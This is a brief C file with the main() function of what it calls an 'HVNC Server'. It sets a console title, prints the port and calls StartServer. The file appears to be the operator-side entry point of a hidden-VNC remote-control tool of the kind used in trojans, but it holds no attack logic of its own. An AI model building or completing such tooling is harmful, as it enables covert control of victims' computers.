#include "common.h"
#include "controlwindow.h"
#include "server.h"

int main( void )
{
    HANDLE handleConsole = GetStdHandle( STD_OUTPUT_HANDLE );
    SetConsoleTitleA( CONSOLE_TITLE );
    printf( "[+] Starting HVNC Server on Port: %d\n", PORT );
   
    StartServer( PORT );
    getchar();

    CloseHandle( handleConsole );
    return 0;
};
